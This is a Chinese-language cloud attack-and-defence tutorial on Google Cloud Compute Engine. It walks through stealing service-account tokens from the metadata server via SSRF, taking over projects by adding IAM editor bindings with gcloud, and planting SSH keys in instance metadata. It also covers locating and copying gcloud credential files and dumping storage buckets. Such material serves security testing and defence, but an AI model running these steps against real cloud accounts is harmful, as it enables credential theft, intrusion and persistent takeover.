---
title: 谷歌云 Compute Engine 弹性计算服务攻防
id: gcp_compute_engine
---

## 0x01、初始访问
### 1、元数据
每个虚拟机 (VM) 实例都将其元数据存储在元数据服务器上。您的虚拟机可自动获得对元数据服务器 API 的访问权限，而无需任何额外的授权。

<!-- more -->

查询元数据服务器的内容，您可以从虚拟机实例中向以下根网址发出请求。请使用 
http://metadata.google.internal/computeMetadata/v1/ 网址向元数据服务器发出请求。
Google 为其 API 端点实施了一些额外的安全措施——查询 Google Cloud Metadata APIv1 需要特殊的标头:Metadata-Flavor: Google

```

> attributes/        metadata创建或更新 VM 时在字段中传递的用户定义元数据。
> attributes/ssh-keys        metadata通过值在字段中创建 VM 期间传递的公共 SSH 密钥列表ssh-keys。
> description        创建或更新 VM 时传递的文本描述。
> disks/        连接到 VM 的磁盘。
> hostname        分配给 VM 的限定域名
> id        虚拟机的 ID。ID 在创建 VM 时自动生成，并且在 Yandex Cloud 中是唯一的。
> name        创建或更新 VM 时传递的名称。
> networkInterfaces/        连接到 VM 的网络接口。
> service-accounts        链接到 VM 的服务账户
> service-accounts/default/token        关联服务账户的IAM令牌

```

### 2、凭证泄露
服务帐号密钥可能无意中进入不应存储的位置。不法分子可能会使用泄露的服务帐号密钥在您的环境中进行身份验证
可能会存在服务帐号密钥的位置，包括：开源项目的源代码库、公共 Cloud Storage 存储桶、遭破解服务的公共数据转储、电子邮件收件箱、文件共享、备份存储、临时文件系统目录
如果找到这些文件之一，可以通过gcloud命令使用此服务帐户重新进行身份验证。

## 0x02、命令执行
### 1、接管项目
当找到权限大得凭证时，可以通过gcloud命令使用此服务帐户重新进行身份验证。

> gcloud auth activate-service-account --key-file [FILE]

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810013-975948-1.png)


输出项目的IAM策略

> gcloud projects get-iam-policy example-project-id-1

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810549-65456-2.png)


要在“example-project-id-1”的项目上为用户“test-user@gmail.com”的“roles/editor”角色添加 IAM 策略绑定

> gcloud projects add-iam-policy-binding example-project-id-1 --member='user:test-user@gmail.com' --role='roles/editor'

拿到高权限服务账户的凭证然后就可以通过gcloud调用凭证去添加其他谷歌用户项目权限，下面添加editor权限，可以看到能够使用我们添加的用户去管理这个项目了

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810573-880042-image.png)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810608-620590-4.png)


2、获取项目级实例权限
利用方式：Web应用程序漏洞（如SSRF/XXE/RCE）等，假设存在的Web应用程序存在SSRF漏洞，使用浏览器访问 URL 应用程序应如下所示

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810626-884448-5.png)

在URL处输入http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json，Header处输入Metadata-Flavor: Google，成功获取了access_token，当然，我们也可以通过上面列表去访问其他API获取更多的信息。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810640-388175-6.png)

使用scopes参数获取access token的使用范围

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810655-540667-7.png)

如果有修改元数据的权限，则有办法实现权限提升，有以下情况：
默认账户启用了允许访问所有Cloud API或自定义服务账户具有https://www.googleapis.com/auth/compute、https://www.googleapis.com/auth/cloud-platform权限范围
首先要先获取元数据中fingerprint

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810669-319568-8.png)

然后使用setCommonInstanceMetadata方法去添加(此次项目中没有旧的密钥，如果有旧的密钥，需要"value": "EXISTING_SSH_KEYS\nNEW_SSH_KEY")

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810682-485241-9.png)

再去看下，成功写入，拿到实例控制权限

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810689-197530-10.png)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810694-184991-11.png)

### 3、SSH密钥泄露
当谷歌云ssh的密钥被泄露后我们可以登陆该Compute Engine实例执行一系列恶意操作命令。

## 0x03、权限提升
### 1、修改元数据
如果能够修改原数据，则可以将SSH密钥添加到实例级元数据。
### 2、窃取 gcloud 授权
很可能同一机器上的其他用户一直在gcloud使用比您自己的帐户更强大的帐户运行命令。您需要本地root权限才能执行此操作。
首先，查找gcloud用户的主文件夹中存在哪些配置目录。

> $ sudo find / -name "gcloud"

您可以手动检查里面的文件，但这些通常是带有秘密的文件：

> - ~/.config/gcloud/credentials.db
> - ~/.config/gcloud/legacy_credentials/[ACCOUNT]/adc.json
> - ~/.config/gcloud/legacy_credentials/[ACCOUNT]/.boto
> - ~/.credentials.json

现在，您可以选择在这些文件中查找明文凭据，或者简单地将整个gcloud文件夹复制到您控制和运行的计算机上gcloud auth list，以查看您现在可以使用哪些帐户。
### 3、授予其他用户控制台权限
见命令执行中的接管项目操作

## 0x04、权限维持
### 1、添加项目主账户
加其他用户到项目主账户,其他用户就可以登录控制台去管理项目

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810849-819123-12.png)

### 2、添加新密钥
在其他高权限服务账户种创建新密钥，可以在当前用户权限掉后，继续使用高权限得用户凭证去实现权限维持

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648810872-395838-13.png)

### 3、添加项目级ssh密钥
添加项目级ssh密钥，可以让我们是随意控制项目下的虚拟机

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811011-753874-14.png)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811065-541896-15.png)

## 0x05、信息收集
### 1、元数据
通过元数据进行信息收集

> attributes/        metadata创建或更新 VM 时在字段中传递的用户定义元数据。
> attributes/ssh-keys        metadata通过值在字段中创建 VM 期间传递的公共 SSH 密钥列表ssh-keys。
> description        创建或更新 VM 时传递的文本描述。
> disks/        连接到 VM 的磁盘。
> hostname        分配给 VM 的限定域名
> id        虚拟机的 ID。ID 在创建 VM 时自动生成，并且在 Yandex Cloud 中是唯一的。
> name        创建或更新 VM 时传递的名称。
> networkInterfaces/        连接到 VM 的网络接口。
> service-accounts        链接到 VM 的服务账户
> service-accounts/default/token        关联服务账户的IAM令牌

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811158-781505-16.png)


### 2、子网信息
通过获取项目权限后，在控制台进行查看子网信息

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811167-905561-17.png)

### 3、用户数据
目标实例上运行的服务以及存储的数据
### 4、密钥
很有可能机器上的其他用户比你当前的账户权限更大，我们可以寻找一下敏感文件

> sudo find / -name "gcloud"

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811249-720674-18.png)

注意以下文件：

> - ~/.config/gcloud/credentials.db
> - ~/.config/gcloud/legacy_credentials/[ACCOUNT]/adc.json
> - ~/.config/gcloud/legacy_credentials/[ACCOUNT]/.boto
> - ~/.credentials.json

### 5、查看自定义实例模板
实例模板定义实例属性以帮助部署一致的配置，可能包含与运行的实例一样的敏感数据
列出可以获取的模版
> $ gcloud compute instance-templates list

获取模版的信息
> $ gcloud compute instance-templates describe [TEMPLATE NAME]

### 6、枚举存储桶
列出项目中的所有存储桶
> $ gsutil ls

获取项目中所有存储桶的详细信息
> $ gsutil ls -L

列出特定存储桶的内容
> $ gsutil ls -r gs://bucket-name/

将存储桶中的对象复制到本地存储以供查看
> $ gsutil cp gs://bucket-name/folder/object ~/

## 0x06、横向移动
### 1、控制台
在添加项目主账户后，拿到控制台下项目的管理权限，通过控制台去控制当前项目下其他虚拟机实例.

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-01/1648811371-887251-19.png)

### 2、虚拟机实例
在拿到项目下虚拟机实例的权限，可以通过传统渗透方式去进行

## 0x07、影响
### 1、子域名接管
当域名对应的实例销毁或者当实例重新启动后对应的公网ip发生变化，但域名还是指向原来的公网ip，此时会存在子域名被接管的风险，但是由于公网ip的随机性，此攻击的利用成本较大。
### 2、Google Compute Engine (GCE) VM takeover via DHCP flood
由于 ISC DHCP 软件使用的随机数较弱以及其他因素的不幸组合，攻击者可以通过网络接管 Google Cloud Platform 的虚拟机。这是通过从目标虚拟机的角度模拟元数据服务器来完成的。通过安装此漏洞，攻击者可以通过 SSH（公钥身份验证）授予自己访问权限，以便他们可以以 root 用户身份登录。
参考：https://github.com/irsl/gcp-dhcp-takeover-code-exec

## 0x08、总结
整体而言，谷歌云Compute Engine下的攻击手法主要还是由于凭证泄露、配置错误这类问题导致的。

## 参考
https://cloud.google.com/compute/docs/instances/connecting-advanced#sa_ssh_manual
https://cloud.google.com/compute/docs/connect/add-ssh-keys#api_3
https://cloud.google.com/sdk/gcloud/reference/projects/get-iam-policy?hl=zh-cn
https://cloud.google.com/iam/docs/impersonating-service-accounts?authuser=1&_ga=2.81056407.-1414587130.1644838399
